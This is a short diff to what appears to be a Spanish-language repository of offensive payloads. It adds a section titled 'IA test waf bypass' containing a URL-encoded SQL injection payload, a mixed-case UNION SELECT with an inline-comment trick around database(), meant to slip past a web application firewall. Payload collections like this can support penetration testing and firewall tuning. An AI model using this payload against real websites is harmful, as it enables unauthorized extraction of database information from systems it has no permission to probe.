@@ -71,6 +71,7 @@ La mayoria de los payloads aquí mostrados estan creados o modificados por mi.
     * [MSSQL](#MSSQL)
     * [Xpath injection](#Xpath-injection)
     * [Error based](#Error-based)
+    * [IA test waf bypass](#IA-test-waf-bypass)
         
         
    
@@ -1162,3 +1163,14 @@ Extraer información:
 
 
 ```
+
+## IA test waf bypass
+
+```
+uNion%20sElECt%20%2F*%21%20dAtaBaSE()%20*%2F%2b--%2b
+
+
+
+
+```
+
